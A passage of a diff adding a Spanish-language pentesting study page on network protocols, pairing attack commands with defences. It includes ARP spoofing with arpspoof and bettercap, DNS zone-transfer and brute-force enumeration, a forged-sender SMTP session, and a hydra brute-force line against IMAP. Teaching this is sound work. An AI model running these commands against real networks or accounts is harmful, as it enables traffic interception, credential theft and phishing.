+          <div class="flow-arrow">→</div>
+          <div class="flow-step">Gateway</div>
+        </div>
+        <div style="font-size:12px;color:var(--text2);">El atacante reenvía (y puede modificar) el tráfico entre víctima y gateway</div>
+      </div>
+    </div>
+
+    <div class="callout hacker">
+      <div class="callout-title">🏴‍☠️ Herramientas de ARP Spoofing</div>
+      <div class="code-block">
+        <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># arpspoof (dsniff package)</span>
+<span class="c"># Envenenar a la víctima diciéndole que el atacante es el gateway</span>
+<span class="k">sudo</span> arpspoof <span class="v">-i</span> eth0 <span class="v">-t</span> VICTIMA_IP GATEWAY_IP
+
+<span class="c"># Y al gateway diciéndole que el atacante es la víctima</span>
+<span class="k">sudo</span> arpspoof <span class="v">-i</span> eth0 <span class="v">-t</span> GATEWAY_IP VICTIMA_IP
+
+<span class="c"># Habilitar IP forwarding para no cortar el tráfico</span>
+<span class="k">echo</span> <span class="n">1</span> > /proc/sys/net/ipv4/ip_forward
+
+<span class="c"># bettercap (más moderno y completo)</span>
+<span class="k">sudo</span> bettercap <span class="v">-iface</span> eth0
+<span class="c"># bettercap prompt:</span>
+net.probe <span class="k">on</span>
+arp.spoof <span class="k">on</span>
+net.sniff <span class="k">on</span></pre>
+      </div>
+    </div>
+
+    <div class="accordion">
+      <div class="acc-header" onclick="toggleAcc(this)">
+        <span>🛡 Defensa: Dynamic ARP Inspection (DAI)</span><span class="acc-arrow">▶</span>
+      </div>
+      <div class="acc-body">
+        <p>DAI trabaja con DHCP Snooping: usa la tabla DHCP Snooping Binding (IP ↔ MAC ↔ Puerto) para validar cada ARP Reply. Si la MAC-IP del Reply no coincide con la binding table → el paquete es descartado.</p>
+        <div class="code-block">
+          <div class="code-header"><span>cisco ios</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre>Switch(config)# <span class="k">ip arp inspection vlan</span> <span class="n">10</span>
+
+<span class="c">! Puertos trusted (uplinks) no validan</span>
+Switch(config-if)# <span class="k">ip arp inspection trust</span>
+
+<span class="c">! Ver violaciones</span>
+Switch# <span class="k">show ip arp inspection statistics</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="scenario">
+      <div class="scenario-title">📋 Lab: ARP Spoofing en red virtual</div>
+      <ol>
+        <li>Crea 3 VMs: atacante (Kali), víctima (Ubuntu), gateway (cualquiera)</li>
+        <li>En Kali: corre <span class="inline-cmd">arp -a</span> para ver la tabla inicial</li>
+        <li>Ejecuta arpspoof bidireccional + habilita ip_forward</li>
+        <li>En Wireshark del atacante: observa el tráfico HTTP de la víctima</li>
+        <li>En la víctima: ejecuta <span class="inline-cmd">arp -a</span> y nota cómo la MAC del gateway cambió</li>
+        <li>Activa DAI en un switch virtual (GNS3/Packet Tracer) y repite — el ataque no funciona</li>
+      </ol>
+    </div>
+  </section>
+
+  <!-- ICMP -->
+  <section id="icmp">
+    <div class="section-header">
+      <div class="section-icon" style="background:#0d2340">🔵</div>
+      <h2>ICMP — Diagnóstico de Red</h2>
+      <span class="badge" style="background:rgba(88,166,255,.15);color:var(--blue)">Capa 3</span>
+    </div>
+
+    <div class="card">
+      <h3>ping y traceroute</h3>
+      <div class="code-block">
+        <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># ping — verifica conectividad y mide latencia</span>
+<span class="k">ping</span> 8.8.8.8              <span class="c"># ping continuo</span>
+<span class="k">ping</span> <span class="v">-c</span> <span class="n">4</span> 8.8.8.8        <span class="c"># 4 paquetes y para</span>
+<span class="k">ping</span> <span class="v">-i</span> <span class="n">0.2</span> 8.8.8.8      <span class="c"># ping rápido cada 0.2s</span>
+<span class="k">ping</span> <span class="v">-s</span> <span class="n">1472</span> 8.8.8.8     <span class="c"># paquetes de 1472 bytes (test MTU)</span>
+
+<span class="c"># traceroute — muestra la ruta que toman los paquetes</span>
+<span class="k">traceroute</span> 8.8.8.8       <span class="c"># Linux</span>
+<span class="k">tracert</span> 8.8.8.8          <span class="c"># Windows</span>
+<span class="k">traceroute</span> <span class="v">-n</span> 8.8.8.8    <span class="c"># sin resolver DNS (más rápido)</span>
+<span class="k">mtr</span> 8.8.8.8              <span class="c"># traceroute + ping en tiempo real</span></pre>
+      </div>
+    </div>
+
+    <div class="card">
+      <h3>Leyendo un traceroute</h3>
+      <div class="code-block">
+        <div class="code-header"><span>output de ejemplo</span></div>
+        <pre><span class="c"># traceroute google.com</span>
+ <span class="n">1</span>  192.168.1.1    <span class="n">1.2</span> ms   <span class="c">← tu router/gateway</span>
+ <span class="n">2</span>  10.10.0.1      <span class="n">5.4</span> ms   <span class="c">← router ISP</span>
+ <span class="n">3</span>  * * *                   <span class="c">← hop que no responde ICMP (firewall)</span>
+ <span class="n">4</span>  72.14.194.1    <span class="n">15.2</span> ms  <span class="c">← red de Google</span>
+ <span class="n">5</span>  8.8.8.8        <span class="n">16.8</span> ms  <span class="c">← destino</span></pre>
+      </div>
+      <p style="font-size:13px;color:var(--text2);margin-top:.5rem;">Cada "hop" es un router. El <strong>TTL</strong> (Time To Live) se decrementa en 1 en cada hop. Cuando llega a 0, el router descarta el paquete y envía un ICMP "Time Exceeded" → traceroute lo captura para mostrar ese hop.</p>
+    </div>
+
+    <div class="callout hacker">
+      <div class="callout-title">🏴‍☠️ ICMP en Pentesting</div>
+      <ul>
+        <li><strong>ICMP Ping Sweep:</strong> descubrir hosts activos en una red: <span class="inline-cmd">nmap -sn 192.168.1.0/24</span></li>
+        <li><strong>ICMP Tunneling:</strong> exfiltrar datos encapsulandolos en paquetes ping (bypassa algunos firewalls). Herramienta: <span class="inline-cmd">ptunnel</span></li>
+        <li><strong>Ping of Death:</strong> enviar paquetes ICMP malformados para crashear sistemas (histórico, ya no funciona en sistemas modernos)</li>
+        <li><strong>Smurf Attack:</strong> DDoS amplificado usando ICMP broadcast dirigido</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- BGP -->
+  <section id="bgp">
+    <div class="section-header">
+      <div class="section-icon" style="background:#2a1a4e">🌐</div>
+      <h2>BGP — Border Gateway Protocol</h2>
+      <span class="badge" style="background:rgba(188,140,255,.15);color:var(--purple)">Internet Routing</span>
+    </div>
+
+    <div class="card">
+      <h3>¿Qué es BGP?</h3>
+      <p style="font-size:13.5px;color:var(--text2);">BGP es el protocolo que hace funcionar Internet. Conecta los Sistemas Autónomos (AS) — los bloques de IPs administrados por ISPs, empresas, y gobiernos. Cada AS anuncia qué prefijos IP (rangos) puede alcanzar. BGP usa el camino con el menor número de ASes para enrutar el tráfico.</p>
+    </div>
+
+    <div class="accordion">
+      <div class="acc-header" onclick="toggleAcc(this)">
+        <span>🔴 Ataque: BGP Hijacking</span><span class="acc-arrow">▶</span>
+      </div>
+      <div class="acc-body">
+        <p>Un AS malicioso (o comprometido) anuncia rutas falsas para prefijos que no le pertenecen. Si su anuncio es más específico (prefijo /24 vs /16), los routers prefieren la ruta más específica → el tráfico se redirige al atacante.</p>
+        <br>
+        <p><strong>Casos reales:</strong></p>
+        <ul style="padding-left:1.5rem;margin-top:.5rem;font-size:13px;">
+          <li><strong>2010:</strong> China Telecom anunció 50,000 prefijos por 18 minutos — tráfico de US DoD, NASA y Senado fue ruteado por China.</li>
+          <li><strong>2018:</strong> Tráfico de Amazon Route 53 (DNS) fue hijackeado para robar criptomonedas.</li>
+          <li><strong>2022:</strong> BGP hijack para interceptar tráfico de Rostelecom en Rusia.</li>
+        </ul>
+        <br>
+        <p><strong>Defensas:</strong></p>
+        <ul style="padding-left:1.5rem;margin-top:.5rem;font-size:13px;">
+          <li><strong>RPKI (Resource Public Key Infrastructure):</strong> firma criptográfica de los anuncios BGP. El router valida que el AS tiene derecho a anunciar ese prefijo.</li>
+          <li><strong>BGPsec:</strong> extiende RPKI con validación de caminos completos.</li>
+          <li><strong>Filtrado de prefijos:</strong> los ISPs configuran prefix-lists para no aceptar anuncios sospechosos.</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="callout profundizar">
+      <div class="callout-title">🔬 Para Profundizar</div>
+      <ul>
+        <li>BGP usa TCP puerto 179. Los routers establecen sesiones eBGP entre ASes</li>
+        <li>Herramienta: <span class="inline-cmd">bgpstream</span> para monitoreo de anuncios BGP en tiempo real</li>
+        <li>Sitios: <a href="https://bgpstream.caida.org" style="color:var(--blue)">bgpstream.caida.org</a>, <a href="https://stat.ripe.net" style="color:var(--blue)">stat.ripe.net</a></li>
+        <li>Libro recomendado: "BGP Design and Implementation" de Randy Zhang</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- DNS -->
+  <section id="dns">
+    <div class="section-header">
+      <div class="section-icon" style="background:#0f3d1f">🌍</div>
+      <h2>DNS — Domain Name System</h2>
+      <span class="badge" style="background:rgba(63,185,80,.15);color:var(--green)">UDP/TCP 53</span>
+    </div>
+
+    <div class="card">
+      <h3>Jerarquía DNS</h3>
+      <div class="flow" style="flex-direction:column;align-items:flex-start;gap:8px;">
+        <div class="flow-step" style="background:rgba(188,140,255,.1);border-color:var(--purple);min-width:280px;">Root Servers ( . ) — 13 clusters, operados por ICANN/Verisign/etc</div>
+        <div class="flow-arrow" style="padding-left:20px;">↓</div>
+        <div class="flow-step" style="background:rgba(88,166,255,.1);border-color:var(--blue);min-width:280px;">TLD Servers — .com, .cl, .org, .net, .io</div>
+        <div class="flow-arrow" style="padding-left:20px;">↓</div>
+        <div class="flow-step" style="background:rgba(63,185,80,.1);border-color:var(--green);min-width:280px;">Authoritative Nameservers — ns1.ejemplo.com</div>
+        <div class="flow-arrow" style="padding-left:20px;">↓</div>
+        <div class="flow-step" style="background:var(--bg3);min-width:280px;">Resolver local (tu ISP o 8.8.8.8)</div>
+      </div>
+    </div>
+
+    <div class="tabs">
+      <button class="tab active" onclick="switchTab('dns','cmds')">Comandos</button>
+      <button class="tab" onclick="switchTab('dns','types')">Tipos de registros</button>
+      <button class="tab" onclick="switchTab('dns','attacks')">Ataques</button>
+    </div>
+
+    <div id="dns-cmds" class="tab-content active">
+      <div class="code-block">
+        <div class="code-header"><span>bash — DNS enumeration</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># nslookup — básico y multiplataforma</span>
+<span class="k">nslookup</span> google.com
+<span class="k">nslookup</span> <span class="v">-type=MX</span> gmail.com    <span class="c"># servidores de mail</span>
+<span class="k">nslookup</span> <span class="v">-type=TXT</span> google.com   <span class="c"># registros TXT (SPF/DKIM)</span>
+
+<span class="c"># dig — más potente, preferido en Linux</span>
+<span class="k">dig</span> google.com
+<span class="k">dig</span> <span class="v">+short</span> google.com          <span class="c"># solo la respuesta</span>
+<span class="k">dig</span> MX gmail.com               <span class="c"># registros MX</span>
+<span class="k">dig</span> TXT google.com             <span class="c"># registros TXT</span>
+<span class="k">dig</span> <span class="v">@8.8.8.8</span> google.com        <span class="c"># usar servidor DNS específico</span>
+<span class="k">dig</span> <span class="v">-x</span> 8.8.8.8                <span class="c"># reverse DNS lookup</span>
+
+<span class="c"># Transferencia de zona (si está mal configurada)</span>
+<span class="k">dig</span> AXFR <span class="v">@ns1.ejemplo.com</span> ejemplo.com
+<span class="k">host</span> <span class="v">-l</span> ejemplo.com ns1.ejemplo.com
+
+<span class="c"># dnsrecon — enumeración completa</span>
+<span class="k">dnsrecon</span> <span class="v">-d</span> ejemplo.com
+<span class="k">dnsrecon</span> <span class="v">-d</span> ejemplo.com <span class="v">-t</span> axfr  <span class="c"># intentar transferencia de zona</span>
+<span class="k">dnsrecon</span> <span class="v">-d</span> ejemplo.com <span class="v">-t</span> brt <span class="v">-D</span> /usr/share/dnsrecon/namelist.txt
+
+<span class="c"># amass — OSINT + subdomain enumeration</span>
+<span class="k">amass</span> enum <span class="v">-d</span> ejemplo.com
+<span class="k">amass</span> enum <span class="v">-passive -d</span> ejemplo.com</pre>
+      </div>
+    </div>
+
+    <div id="dns-types" class="tab-content">
+      <table>
+        <thead><tr><th>Tipo</th><th>Descripción</th><th>Valor de ejemplo</th><th>Uso en seguridad</th></tr></thead>
+        <tbody>
+          <tr><td><span class="tag tag-blue">A</span></td><td>IPv4 del dominio</td><td>142.250.80.14</td><td>Mapeo dominio→IP</td></tr>
+          <tr><td><span class="tag tag-blue">AAAA</span></td><td>IPv6 del dominio</td><td>2607:f8b0::200e</td><td>Infraestructura IPv6</td></tr>
+          <tr><td><span class="tag tag-green">MX</span></td><td>Servidor de email</td><td>mail.google.com</td><td>Phishing, enumeración</td></tr>
+          <tr><td><span class="tag tag-yellow">TXT</span></td><td>Texto arbitrario</td><td>v=spf1 include:...</td><td>SPF, DKIM, verificación</td></tr>
+          <tr><td><span class="tag tag-purple">NS</span></td><td>Nameservers autoritativos</td><td>ns1.google.com</td><td>Atacar DNS de zona</td></tr>
+          <tr><td><span class="tag tag-red">CNAME</span></td><td>Alias a otro dominio</td><td>www → example.com</td><td>Subdomain takeover</td></tr>
+          <tr><td><span class="tag tag-blue">PTR</span></td><td>Reverse DNS (IP→dominio)</td><td>host.example.com</td><td>Recon, correlación</td></tr>
+          <tr><td><span class="tag tag-green">SOA</span></td><td>Inicio de autoridad</td><td>ns1.example.com admin...</td><td>Info de zona</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div id="dns-attacks" class="tab-content">
+      <div class="callout hacker">
+        <div class="callout-title">🏴‍☠️ Transferencia de Zona (AXFR)</div>
+        <p>Si el nameserver está mal configurado, permite transferencia de zona a cualquier IP — te da <strong>todos</strong> los registros DNS del dominio: subdominios internos, IPs privadas, servidores de staging, etc. Es como obtener el mapa completo de la infraestructura.</p>
+        <div class="code-block" style="margin-top:.5rem;">
+          <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="k">dig</span> AXFR @ns1.vulnerable.com vulnerable.com
+<span class="c"># Si está permitido, verás TODOS los registros del dominio</span></pre>
+        </div>
+      </div>
+
+      <div class="callout hacker">
+        <div class="callout-title">🏴‍☠️ DNS Cache Poisoning</div>
+        <p>El atacante inyecta respuestas DNS falsas en el caché del resolver. Cuando alguien consulta "banco.cl", el resolver envenenado devuelve la IP del atacante → phishing perfecto. Defensa: DNSSEC valida criptográficamente las respuestas.</p>
+      </div>
+
+      <div class="callout profundizar">
+        <div class="callout-title">🔬 Para Profundizar</div>
+        <ul>
+          <li><strong>DNSSEC:</strong> firma criptográfica de registros DNS. Valida autenticidad e integridad.</li>
+          <li><strong>DoH (DNS over HTTPS):</strong> cifra las consultas DNS en HTTPS — privacidad pero dificulta monitoreo empresarial.</li>
+          <li><strong>DoT (DNS over TLS):</strong> cifra en TLS puerto 853 — mismo objetivo que DoH.</li>
+          <li><strong>Subdomain Takeover:</strong> CNAME apunta a un servicio eliminado → el atacante registra ese servicio y controla el subdominio.</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <!-- WHOIS -->
+  <section id="whois">
+    <div class="section-header">
+      <div class="section-icon" style="background:#3d2a00">🔍</div>
+      <h2>WHOIS & Reconocimiento Pasivo</h2>
+      <span class="badge" style="background:rgba(210,153,34,.15);color:var(--yellow)">OSINT</span>
+    </div>
+
+    <div class="card">
+      <h3>¿Qué revela WHOIS?</h3>
+      <div class="code-block">
+        <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># WHOIS de un dominio</span>
+<span class="k">whois</span> google.com
+
+<span class="c"># WHOIS de una IP (quién administra ese bloque)</span>
+<span class="k">whois</span> 8.8.8.8
+
+<span class="c"># Salida típica incluye:</span>
+<span class="c"># Registrant: empresa/persona que registró el dominio</span>
+<span class="c"># Admin Email: email del administrador (útil para phishing)</span>
+<span class="c"># Name Servers: ns1.dominio.com, ns2.dominio.com</span>
+<span class="c"># Creation/Expiration Date: fechas clave</span>
+<span class="c"># Registrar: GoDaddy, Namecheap, etc.</span></pre>
+      </div>
+    </div>
+
+    <div class="callout hacker">
+      <div class="callout-title">🏴‍☠️ WHOIS en reconocimiento — qué buscar</div>
+      <ul>
+        <li><strong>Email del admin:</strong> target para spear phishing o credential stuffing</li>
+        <li><strong>Fecha de expiración:</strong> si expira pronto y no se renueva → domain hijacking (registras tú el dominio)</li>
+        <li><strong>Name Servers:</strong> si usas ns1.empresavulnerable.com, atacar esos NS te da control del DNS</li>
+        <li><strong>Rangos de IP:</strong> en WHOIS de IPs obtienes el bloque completo asignado a la empresa → mapa de infraestructura</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <h3>RIRs — quién administra las IPs por región</h3>
+      <table>
+        <thead><tr><th>RIR</th><th>Región</th><th>URL</th></tr></thead>
+        <tbody>
+          <tr><td><strong>ARIN</strong></td><td>América del Norte</td><td style="color:var(--blue)">arin.net</td></tr>
+          <tr><td><strong>RIPE NCC</strong></td><td>Europa, Medio Oriente, Asia Central</td><td style="color:var(--blue)">ripe.net</td></tr>
+          <tr><td><strong>LACNIC</strong></td><td>América Latina y el Caribe</td><td style="color:var(--blue)">lacnic.net</td></tr>
+          <tr><td><strong>APNIC</strong></td><td>Asia-Pacífico</td><td style="color:var(--blue)">apnic.net</td></tr>
+          <tr><td><strong>AFRINIC</strong></td><td>África</td><td style="color:var(--blue)">afrinic.net</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="callout profundizar">
+      <div class="callout-title">🔬 Más herramientas OSINT</div>
+      <ul>
+        <li><strong>Shodan:</strong> buscador de dispositivos conectados. <span class="inline-cmd">org:"Empresa Chile"</span> → todos sus servidores expuestos</li>
+        <li><strong>Censys:</strong> similar a Shodan, enfocado en certificados TLS</li>
+        <li><strong>theHarvester:</strong> recolectar emails, subdominios y IPs de fuentes públicas</li>
+        <li><strong>Maltego:</strong> visualización de relaciones en OSINT</li>
+        <li><strong>Google Dorks:</strong> <span class="inline-cmd">site:empresa.cl filetype:pdf</span> para encontrar documentos expuestos</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- HTTP/TLS -->
+  <section id="http">
+    <div class="section-header">
+      <div class="section-icon" style="background:#0d2340">🔒</div>
+      <h2>HTTP / HTTPS / TLS</h2>
+      <span class="badge" style="background:rgba(88,166,255,.15);color:var(--blue)">TCP 80 / 443</span>
+    </div>
+
+    <div class="tabs">
+      <button class="tab active" onclick="switchTab('http','basics')">HTTP básico</button>
+      <button class="tab" onclick="switchTab('http','tls')">TLS / HTTPS</button>
+      <button class="tab" onclick="switchTab('http','tools')">Herramientas</button>
+    </div>
+
+    <div id="http-basics" class="tab-content active">
+      <div class="card">
+        <h3>HTTP con Telnet — hablar el protocolo manualmente</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c"># Conectar por telnet al puerto 80</span>
+<span class="k">telnet</span> example.com <span class="n">80</span>
+
+<span class="c"># Escribir la request HTTP manualmente:</span>
+GET / HTTP/1.1
+Host: example.com
+(presionar Enter dos veces)
+
+<span class="c"># Respuesta del servidor:</span>
+<span class="c"># HTTP/1.1 200 OK</span>
+<span class="c"># Content-Type: text/html</span>
+<span class="c"># ...</span>
+
+<span class="c"># Con cURL (más práctico)</span>
+<span class="k">curl</span> <span class="v">-v</span> http://example.com        <span class="c"># verbose: muestra headers</span>
+<span class="k">curl</span> <span class="v">-I</span> http://example.com        <span class="c"># solo headers (HEAD request)</span>
+<span class="k">curl</span> <span class="v">-X POST -d</span> <span class="s">"user=admin"</span> http://example.com/login</pre>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Códigos de estado HTTP</h3>
+        <table>
+          <thead><tr><th>Código</th><th>Significado</th><th>Relevancia en seguridad</th></tr></thead>
+          <tbody>
+            <tr><td><span class="tag tag-green">200</span></td><td>OK</td><td>Recurso existe y accesible</td></tr>
+            <tr><td><span class="tag tag-blue">301/302</span></td><td>Redirect</td><td>Open redirect → phishing</td></tr>
+            <tr><td><span class="tag tag-yellow">401</span></td><td>Unauthorized</td><td>Autenticación requerida</td></tr>
+            <tr><td><span class="tag tag-yellow">403</span></td><td>Forbidden</td><td>Recurso existe pero bloqueado</td></tr>
+            <tr><td><span class="tag tag-red">404</span></td><td>Not Found</td><td>Recurso no existe</td></tr>
+            <tr><td><span class="tag tag-red">500</span></td><td>Server Error</td><td>Posible info disclosure</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+
+    <div id="http-tls" class="tab-content">
+      <div class="card">
+        <h3>TLS Handshake — cómo se establece HTTPS</h3>
+        <div class="flow" style="flex-direction:column;align-items:flex-start;gap:8px;">
+          <div class="flow-step highlight">1. Client Hello → versiones TLS soportadas + cipher suites</div>
+          <div class="flow-arrow" style="padding-left:20px;">↓</div>
+          <div class="flow-step">2. Server Hello → versión elegida + certificado X.509</div>
+          <div class="flow-arrow" style="padding-left:20px;">↓</div>
+          <div class="flow-step success">3. Key Exchange → se acuerda una clave de sesión</div>
+          <div class="flow-arrow" style="padding-left:20px;">↓</div>
+          <div class="flow-step success">4. Finished → todo el tráfico se cifra con la clave de sesión</div>
+        </div>
+      </div>
+
+      <div class="callout key">
+        <div class="callout-title">🔑 Conceptos clave</div>
+        <ul>
+          <li><strong>Perfect Forward Secrecy (PFS):</strong> cada sesión usa una clave efímera. Si comprometes la clave privada del servidor, NO puedes descifrar sesiones pasadas.</li>
+          <li><strong>TLS 1.3 vs 1.2:</strong> TLS 1.3 elimina cipher suites inseguros, usa solo ECDHE para PFS, y reduce el handshake a 1 RTT (más rápido).</li>
+          <li><strong>Certificate Pinning:</strong> la app verifica que el certificado coincida con uno específico — previene MITM incluso con CAs comprometidas.</li>
+        </ul>
+      </div>
+
+      <div class="callout hacker">
+        <div class="callout-title">🏴‍☠️ Burp Suite como proxy MITM</div>
+        <p>Burp Suite actúa como proxy entre tu browser y el servidor. Tu browser confía en el certificado de Burp (lo instalas como CA de confianza), Burp descifra el HTTPS, te permite modificar la request/response, y lo reenvía al servidor real. Es la herramienta #1 para pentesting de aplicaciones web.</p>
+        <div class="code-block" style="margin-top:.5rem;">
+          <div class="code-header"><span>configuración básica</span></div>
+          <pre><span class="c"># 1. Burp escucha en 127.0.0.1:8080</span>
+<span class="c"># 2. Configura browser proxy → 127.0.0.1:8080</span>
+<span class="c"># 3. Visita http://burpsuite para instalar CA</span>
+<span class="c"># 4. Todo el tráfico HTTPS pasa por Burp descifrado</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div id="http-tools" class="tab-content">
+      <div class="card">
+        <h3>curl y HTTPie</h3>
+        <div class="code-block">
+          <div class="code-header"><span>bash</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+          <pre><span class="c"># curl — el estándar</span>
+<span class="k">curl</span> <span class="v">-v</span> https://api.ejemplo.com       <span class="c"># verbose</span>
+<span class="k">curl</span> <span class="v">-H</span> <span class="s">"Authorization: Bearer TOKEN"</span> https://api.com
+<span class="k">curl</span> <span class="v">-X POST -H</span> <span class="s">"Content-Type: application/json"</span> \
+     <span class="v">-d</span> <span class="s">'{"user":"admin","pass":"1234"}'</span> https://api.com/login
+<span class="k">curl</span> <span class="v">-k</span> https://self-signed.com        <span class="c"># ignorar errores SSL</span>
+<span class="k">curl</span> <span class="v">-o</span> archivo.zip https://ejemplo.com/file.zip  <span class="c"># descargar</span>
+
+<span class="c"># HTTPie — más legible (pip install httpie)</span>
+<span class="k">http</span> GET https://api.ejemplo.com
+<span class="k">http</span> POST https://api.com/login user=admin pass=1234
+<span class="k">http</span> <span class="v">--auth</span> user:pass https://api.com/protected</pre>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- EMAIL -->
+  <section id="email">
+    <div class="section-header">
+      <div class="section-icon" style="background:#3d2a00">📧</div>
+      <h2>Protocolos de Email</h2>
+      <span class="badge" style="background:rgba(210,153,34,.15);color:var(--yellow)">SMTP / POP3 / IMAP</span>
+    </div>
+
+    <table>
+      <thead><tr><th>Protocolo</th><th>Puerto</th><th>Uso</th><th>Puerto seguro</th></tr></thead>
+      <tbody>
+        <tr><td>SMTP</td><td><span class="port">25</span></td><td>Envío de email entre servidores</td><td><span class="port">587</span> (STARTTLS), <span class="port">465</span> (SMTPS)</td></tr>
+        <tr><td>POP3</td><td><span class="port">110</span></td><td>Descarga emails (borra del servidor)</td><td><span class="port">995</span> (POP3S)</td></tr>
+        <tr><td>IMAP</td><td><span class="port">143</span></td><td>Sincroniza emails (mantiene en servidor)</td><td><span class="port">993</span> (IMAPS)</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout key">
+      <div class="callout-title">🔑 POP3 vs IMAP</div>
+      <p><strong>POP3:</strong> descarga y (normalmente) borra del servidor. Un solo dispositivo. Antiguo.<br>
+      <strong>IMAP:</strong> sincroniza con el servidor. Múltiples dispositivos ven los mismos emails. Moderno. Si usas Gmail en tu PC y celular, usas IMAP.</p>
+    </div>
+
+    <div class="card">
+      <h3>SMTP con telnet — enviar email manualmente</h3>
+      <div class="code-block">
+        <div class="code-header"><span>bash — conversación SMTP</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="k">telnet</span> mail.ejemplo.com <span class="n">25</span>
+
+<span class="c"># La conversación:</span>
+<span class="n">220</span> mail.ejemplo.com ESMTP
+EHLO attacker.com
+<span class="n">250</span> Hello
+MAIL FROM: &lt;fake@sender.com&gt;
+<span class="n">250</span> OK
+RCPT TO: &lt;victim@empresa.com&gt;
+<span class="n">250</span> OK
+DATA
+<span class="n">354</span> Start input
+Subject: Urgent security update
+From: admin@empresa.com
+To: victim@empresa.com
+
+Esto es un email de prueba sin autenticación.
+.
+<span class="n">250</span> Message accepted
+QUIT</pre>
+      </div>
+    </div>
+
+    <div class="callout hacker">
+      <div class="callout-title">🏴‍☠️ Email Spoofing y las defensas DNS</div>
+      <p>SMTP no requiere autenticación por defecto — cualquiera puede enviar "desde" cualquier dirección. Las defensas son registros TXT en DNS:</p>
+      <ul>
+        <li><strong>SPF:</strong> lista qué servidores pueden enviar email por tu dominio. Ej: <span class="inline-cmd">v=spf1 include:sendgrid.net ~all</span></li>
+        <li><strong>DKIM:</strong> firma criptográfica en cada email. El destinatario verifica la firma con la clave pública en DNS.</li>
+        <li><strong>DMARC:</strong> política que define qué hacer si SPF/DKIM fallan. Ej: <span class="inline-cmd">v=DMARC1; p=reject; rua=mailto:dmarc@empresa.com</span></li>
+      </ul>
+    </div>
+
+    <div class="callout hacker">
+      <div class="callout-title">🏴‍☠️ Herramientas de email en pentesting</div>
+      <ul>
+        <li><span class="inline-cmd">smtp-user-enum</span>: enumera usuarios válidos en un servidor SMTP vía comandos VRFY/EXPN/RCPT</li>
+        <li><span class="inline-cmd">hydra -l user -P wordlist.txt imap://mail.empresa.com</span>: fuerza bruta en IMAP</li>
+        <li><span class="inline-cmd">swaks</span>: Swiss Army Knife SMTP — herramienta de prueba de email</li>
+      </ul>
+    </div>
+  </section>
+
+  <!-- SSH -->
+  <section id="ssh">
+    <div class="section-header">
+      <div class="section-icon" style="background:#0f3d1f">🔐</div>
+      <h2>SSH — Secure Shell</h2>
+      <span class="badge" style="background:rgba(63,185,80,.15);color:var(--green)">TCP 22</span>
+    </div>
+
+    <div class="tabs">
+      <button class="tab active" onclick="switchTab('ssh','basics')">Básico</button>
+      <button class="tab" onclick="switchTab('ssh','keys')">Claves</button>
+      <button class="tab" onclick="switchTab('ssh','tunneling')">Tunneling</button>
+      <button class="tab" onclick="switchTab('ssh','pentest')">Pentesting</button>
+    </div>
+
+    <div id="ssh-basics" class="tab-content active">
+      <div class="code-block">
+        <div class="code-header"><span>bash — SSH básico</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># Conexión básica</span>
+<span class="k">ssh</span> user@192.168.1.10
+<span class="k">ssh</span> <span class="v">-p</span> <span class="n">2222</span> user@192.168.1.10   <span class="c"># puerto no estándar</span>
+<span class="k">ssh</span> <span class="v">-i</span> ~/.ssh/id_rsa user@server  <span class="c"># usar clave privada</span>
+<span class="k">ssh</span> <span class="v">-v</span> user@server               <span class="c"># verbose (debug conexión)</span>
+
+<span class="c"># Copiar archivos con SSH</span>
+<span class="k">scp</span> archivo.txt user@server:/home/user/
+<span class="k">scp</span> <span class="v">-r</span> directorio/ user@server:/destino/
+<span class="k">rsync</span> <span class="v">-avz</span> local/ user@server:/remote/  <span class="c"># sincronización eficiente</span>
+
+<span class="c"># ~/.ssh/config — atajos de configuración</span>
+Host mi-server
+    HostName 192.168.1.10
+    User admin
+    Port 2222
+    IdentityFile ~/.ssh/id_ed25519
+<span class="c"># Ahora solo: ssh mi-server</span></pre>
+      </div>
+    </div>
+
+    <div id="ssh-keys" class="tab-content">
+      <div class="code-block">
+        <div class="code-header"><span>bash — gestión de claves SSH</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div>
+        <pre><span class="c"># Generar par de claves (Ed25519 es recomendado en 2024)</span>
+<span class="k">ssh-keygen</span> <span class="v">-t</span> ed25519 <span class="v">-C</span> <span class="s">"francisco@empresa.com"</span>
+<span class="c"># Crea: ~/.ssh/id_ed25519 (privada) y ~/.ssh/id_ed25519.pub (pública)</span>
+
+<span class="c"># RSA (legacy, compatible con todo)</span>
+<span class="k">ssh-keygen</span> <span class="v">-t</span> rsa <span class="v">-b</span> <span class="n">4096</span>
+
+<span class="c"># Copiar clave pública al servidor</span>
+<span class="k">ssh-copy-id</span> user@server
+<span class="c"># (la agrega a ~/.ssh/authorized_keys en el servidor)</span>
+
+<span class="c"># Ver huella digital de una clave (para verificar servidor)</span>
+<span class="k">ssh-keygen</span> <span class="v">-lf</span> ~/.ssh/id_ed25519.pub
+
+<span class="c"># ssh-agent — no ingresar passphrase cada vez</span>
